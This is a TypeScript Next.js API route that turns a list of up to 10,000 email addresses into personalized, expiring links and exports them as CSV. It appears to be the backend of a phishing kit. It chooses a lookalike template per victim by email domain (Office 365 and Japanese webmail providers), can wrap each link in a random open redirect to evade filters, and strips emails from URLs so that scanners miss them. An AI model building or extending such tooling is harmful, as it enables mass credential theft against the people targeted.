import { NextRequest, NextResponse } from 'next/server'
import { createPersonalizedLink } from '@/lib/linkManagement'
import { buildFinalLinkURL } from '@/lib/linkUrlBuilder'
import type { LinkFormat } from '@/lib/linkManagerTypes'

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    const {
      emailList,      // Array of emails
      redirectList,   // Array of redirect URLs (optional)
      useOpenRedirect,
      encodeUrl,
      template,       // 'auto-detect' or template ID
      loadingScreen,
      duration,
      expirationHours = 24,
      link_format
    } = body
    
    // MULTI-MODE FIX: Validate and set link_format (supports A, B, C, BOTH)
    const linkFormat: LinkFormat = (link_format && ['A', 'B', 'C', 'BOTH'].includes(link_format)) 
      ? link_format as LinkFormat
      : 'A' // Default to Type A (clean mode) for CSV generation


    // Validation
    if (!emailList || !Array.isArray(emailList) || emailList.length === 0) {
      return NextResponse.json({ error: 'Email list required' }, { status: 400 })
    }

    if (emailList.length > 10000) {
      return NextResponse.json({ error: 'Maximum 10,000 emails allowed' }, { status: 400 })
    }

    // Get base URL
    const baseUrl = process.env.NEXT_PUBLIC_BASE_URL || 
                   process.env.BASE_URL || 
                   `${request.nextUrl.protocol}//${request.headers.get('host') || 'localhost:3000'}`

    // Generate links for each email
    const links: Array<{ email: string; link: string }> = []
    const errors: Array<{ email: string; error: string }> = []

    for (let i = 0; i < emailList.length; i++) {
      const email = emailList[i].trim()
      
      // PRIORITY ZERO FIX: Reject if email is blank
      if (!email || email === '' || !email.includes('@')) {
        errors.push({ 
          email: email || '(empty)',
          error: 'Email is required and must be valid'
        })
        continue
      }

      try {
        // Determine template for this email
        let emailTemplate = template
        if (template === 'auto-detect') {
          const detectedTemplate = detectTemplateFromEmail(email)
          // Validate template exists (fallback to office365 if not found)
          // Note: This is a simple check - full validation would require template storage lookup
          const validTemplates = ['office365', 'biglobe', 'docomo', 'nifty', 'sakura']
          emailTemplate = validTemplates.includes(detectedTemplate) ? detectedTemplate : 'office365'
        }

        // Create personalized link
        const result = await createPersonalizedLink(
          email,
          undefined,
          expirationHours,
          emailTemplate,
          template === 'auto-detect' ? 'auto' : 'manual',
          loadingScreen,
          duration
        )

        // PHASE 7.2 FIX: Extract token from result with validation
        const token = result.token || result.sessionIdentifier || result.linkToken || ''
        
        // CRITICAL: Get link_id from result (for identifier mapping)
        const linkId = result.linkId || null
        
        // PHASE 7.2 FIX: Validate token is not empty
        if (!token || token.trim() === '') {
          console.error('[GENERATE-BULK] Token generation failed for email:', email)
          throw new Error('Failed to generate token - token is empty')
        }
        
        // PHASE 7.2 FIX: Log token generation for debugging
        console.log('[GENERATE-BULK] Generated token:', {
          email: email.substring(0, 20),
          token: token.substring(0, 30) + '...',
          hasToken: !!token,
        })

        // MULTI-MODE FIX: Build proper link based on format
        // Type A: /r/<token> (clean - no email in URL)
        // Type B: /?token=<token>&email=<email> (query mode)
        // Type C: /r/<mappingId>/<token> (red-team mode)
        // BOTH: Default to Type A for CSV generation
        const normalizedEmail = email.toLowerCase().trim()
        
        // Get mappingId for Type C
        // CRITICAL: result.id from createPersonalizedLink IS the mappingId (not link_id)
        // createPersonalizedLink returns: { id: mappingId, ... }
        // The mappingId is generated as: user_${Date.now()}_${random}
        let mappingId: string | null = null
        if (linkFormat === 'C') {
          // Use result.id directly - it's the mappingId
          mappingId = result.id || null
          if (!mappingId) {
            console.error('[GENERATE-BULK] Type C: mappingId (result.id) is missing')
          }
        }
        
        // CRITICAL FIX: Generate short identifiers for Format A and B
        // Format A: identifier maps to token (replaces long JWT in URL)
        // Format B: identifier maps to email (replaces email in URL for scanner safety)
        let identifier: string | null = null
        if (linkFormat === 'A' || linkFormat === 'B') {
          try {
            const { generateShortIdentifier, saveIdentifierMapping } = await import('@/lib/linkIdentifier')
            identifier = generateShortIdentifier()
            
            // Get link_id from result (preferred) or query database
            let finalLinkId: string | null = linkId
            
            if (!finalLinkId) {
              const { sql } = await import('@/lib/sql')
              const linkRecord = sql.get<{ id: string }>(
                `SELECT id FROM links WHERE session_identifier = ? OR link_token = ? LIMIT 1`,
                [token, token]
              )
              
              if (linkRecord?.id) {
                finalLinkId = linkRecord.id
              } else {
                const mappingRecord = sql.get<{ link_id: string }>(
                  `SELECT link_id FROM email_id_mappings WHERE email = ? ORDER BY created_at DESC LIMIT 1`,
                  [normalizedEmail]
                )
                
                if (mappingRecord?.link_id) {
                  finalLinkId = mappingRecord.link_id
                }
              }
            }
            
            if (finalLinkId) {
              // Save identifier mapping
              await saveIdentifierMapping(
                identifier,
                linkFormat === 'A' ? token : normalizedEmail, // For A: token, for B: email
                finalLinkId,
                linkFormat === 'A' ? 'token' : 'email'
              )
              console.log('[GENERATE-BULK] Identifier saved:', {
                identifier: identifier.substring(0, 10),
                linkId: finalLinkId.substring(0, 10),
                type: linkFormat === 'A' ? 'token' : 'email',
                source: linkId ? 'result' : 'database',
              })
            } else {
              console.error('[GENERATE-BULK] Link ID not found for token/email, identifier mapping not saved')
              // Don't fail - use identifier anyway, but log warning
              console.warn('[GENERATE-BULK] Continuing without identifier mapping - link may not resolve correctly')
            }
          } catch (error) {
            console.error('[GENERATE-BULK] Failed to generate/save identifier:', error)
            // Don't fail the entire generation - continue without identifier (fallback to token/email)
            identifier = null
          }
        }
        
        // CRITICAL FIX: Respect user's format selection for personalized links
        // Allow Format A, B, and C for personalized links (user explicitly requested this)
        // Format A: Uses short identifier instead of long JWT
        // Format B: Uses identifier instead of email in URL (scanner-safe)
        // Format C: Uses mappingId in path (as requested)
        const actualFormat = linkFormat === 'BOTH' ? 'A' : linkFormat // Only convert BOTH to A
        
        // MULTI-MODE FIX: Use buildFinalLinkURL for correct format
        // FALLBACK: If identifier generation failed, pass email for Format B (legacy support)
        let finalLink = await buildFinalLinkURL({
          baseUrl,
          format: actualFormat,
          token,
          mappingId: actualFormat === 'C' ? mappingId : null,
          email: (actualFormat === 'B' && !identifier) ? normalizedEmail : null, // Fallback: use email if identifier not available
          identifier: actualFormat === 'A' || actualFormat === 'B' ? identifier : null, // Use identifier for A/B
        })
        
        // CRITICAL FIX: Validate using actualFormat (now respects user's format selection)
        // NOTE: Validation is lenient - if identifier generation fails, we fall back to token/email
        if (actualFormat === 'A') {
          // Type A: Should be /r/<identifier> format (short identifier, no email in URL)
          if (!finalLink.includes('/r/')) {
            console.error('[GENERATE-BULK] Type A link missing /r/ path:', finalLink.substring(0, 50))
            throw new Error('Invalid Type A link format')
          }
          // Type A should use short identifier (8-12 chars) if available, otherwise fallback to token
          if (identifier) {
            // If identifier was generated, it should be in the URL
            if (!finalLink.includes(identifier)) {
              console.error('[GENERATE-BULK] Type A link missing identifier:', finalLink.substring(0, 50))
              throw new Error('Invalid Type A link format - identifier missing')
            }
          } else {
            // Fallback: identifier generation failed, using token (legacy support)
            console.warn('[GENERATE-BULK] Type A: Identifier not generated, using token (legacy mode)')
            if (!finalLink.includes(token.substring(0, 20))) {
              console.error('[GENERATE-BULK] Type A link missing token:', finalLink.substring(0, 50))
              throw new Error('Invalid Type A link format')
            }
          }
          // Type A should NOT have email in query
          if (finalLink.includes('email=')) {
            console.error('[GENERATE-BULK] Type A link incorrectly contains email:', finalLink.substring(0, 50))
            throw new Error('Invalid Type A link format - email should not be in URL')
          }
        } else if (actualFormat === 'B') {
          // Type B: Should have token and id (identifier) in query params: /?token=...&id=<identifier>
          if (!finalLink.includes('token=')) {
            console.error('[GENERATE-BULK] Type B link missing token:', finalLink.substring(0, 50))
            throw new Error('Invalid Type B link format')
          }
          // Type B should use identifier (id param) if available, otherwise fallback to email (legacy)
          if (identifier) {
            // If identifier was generated, it should be in the URL
            if (!finalLink.includes(`id=${identifier}`)) {
              console.error('[GENERATE-BULK] Type B link missing identifier (id param):', finalLink.substring(0, 50))
              throw new Error('Invalid Type B link format - identifier (id) missing')
            }
            // Type B should NOT have email in query when using identifier (scanner-safe)
            if (finalLink.includes('email=')) {
              console.error('[GENERATE-BULK] Type B link incorrectly contains email (should use id):', finalLink.substring(0, 50))
              throw new Error('Invalid Type B link format - should use id (identifier), not email')
            }
          } else {
            // Fallback: identifier generation failed, using email (legacy support)
            console.warn('[GENERATE-BULK] Type B: Identifier not generated, using email (legacy mode)')
            if (!finalLink.includes('email=')) {
              console.error('[GENERATE-BULK] Type B link missing email (legacy mode):', finalLink.substring(0, 50))
              throw new Error('Invalid Type B link format - email required in legacy mode')
            }
          }
          // Type B should NOT be /r/ format
          if (finalLink.includes('/r/')) {
            console.error('[GENERATE-BULK] Type B link incorrectly uses /r/ path:', finalLink.substring(0, 50))
            throw new Error('Invalid Type B link format - should use query params, not /r/ path')
          }
        } else if (actualFormat === 'C') {
          // Type C: Should have mappingId and token in path: /r/<mappingId>/<token>
          if (!finalLink.includes('/r/') || !finalLink.includes(token)) {
            console.error('[GENERATE-BULK] Type C link missing /r/ path or token:', finalLink.substring(0, 50))
            throw new Error('Invalid Type C link format')
          }
          if (!mappingId || !finalLink.includes(mappingId)) {
            console.error('[GENERATE-BULK] Type C link missing mappingId in path:', finalLink.substring(0, 50))
            throw new Error('Invalid Type C link format - mappingId missing')
          }
          // Type C should NOT have email in query
          if (finalLink.includes('email=')) {
            console.error('[GENERATE-BULK] Type C link incorrectly contains email:', finalLink.substring(0, 50))
            throw new Error('Invalid Type C link format - email should not be in URL')
          }
        }
        
        // MULTI-MODE FIX: Log successful link generation
        console.log('[GENERATE-BULK] Generated link:', {
          email: normalizedEmail.substring(0, 20),
          token: token.substring(0, 20) + '...',
          requestedFormat: linkFormat,
          actualFormat: actualFormat, // Log both to show conversion (B → A for personalized)
          link: finalLink.substring(0, 80) + '...',
        })

        // Wrap in open redirect if requested
        if (useOpenRedirect && redirectList && redirectList.length > 0) {
          // Random selection of redirect
          const redirectUrl = redirectList[Math.floor(Math.random() * redirectList.length)].trim()
          
          if (encodeUrl) {
            // Encoded format
            finalLink = `${redirectUrl}${encodeURIComponent(finalLink)}`
          } else {
            // Plain format
            finalLink = `${redirectUrl}${finalLink}`
          }
        }

        links.push({ email, link: finalLink })
      } catch (error) {
        errors.push({ 
          email, 
          error: error instanceof Error ? error.message : 'Unknown error' 
        })
      }
    }

    // Generate CSV content
    const csvContent = generateCSV(links)

    return NextResponse.json({
      success: errors.length === 0,
      count: links.length,
      csv: csvContent,
      links,
      errors: errors.length > 0 ? errors : undefined,
      warning: errors.length > 0 ? `${errors.length} links failed to generate` : undefined
    })

  } catch (error) {
    return NextResponse.json(
      { 
        success: false,
        error: 'Failed to generate bulk links', 
        details: error instanceof Error ? error.message : 'Unknown error' 
      },
      { status: 500 }
    )
  }
}

// Helper: Detect template from email domain
function detectTemplateFromEmail(email: string): string {
  const domain = email.split('@')[1]?.toLowerCase()
  
  if (!domain) return 'office365'
  
  // Check domain patterns
  if (domain.includes('outlook.') || domain.includes('hotmail.') || domain.includes('live.') || domain.includes('office365.')) {
    return 'office365'
  }
  if (domain.includes('biglobe.')) return 'biglobe'
  if (domain.includes('docomo.')) return 'docomo'
  if (domain.includes('nifty.')) return 'nifty'
  if (domain.includes('sakura.')) return 'sakura'
  
  // Check for Gmail/Google (but still use office365 template)
  if (domain.includes('gmail.') || domain.includes('googlemail.')) {
    return 'office365'
  }
  
  // TODO: Check MX records for more accurate detection
  // For now, default to office365 as the most universal template
  return 'office365'
}

// Helper: Generate CSV from links
// PHASE 7.2 FIX: Validate links before CSV generation
function generateCSV(links: Array<{ email: string; link: string }>): string {
  let csv = 'Email,Link\n'
  
  for (const { email, link } of links) {
    // MULTI-MODE FIX: Validate link (don't skip Type A links)
    if (!link || link.trim() === '') {
      console.error('[GENERATE-CSV] Skipping invalid link for email:', email)
      continue
    }
    
    // MULTI-MODE FIX: Accept all valid link formats:
    // Type A: /r/<token> (token in path)
    // Type B: /?token=...&email=... (token in query)
    // Type C: /r/<mappingId>/<token> (token in path)
    // Don't validate format - all are valid for CSV
    
    // Escape commas and quotes in email/link
    const escapedEmail = email.includes(',') || email.includes('"') 
      ? `"${email.replace(/"/g, '""')}"` 
      : email
    const escapedLink = link.includes(',') || link.includes('"')
      ? `"${link.replace(/"/g, '""')}"`
      : link
    csv += `${escapedEmail},${escapedLink}\n`
  }
  
  return csv
}
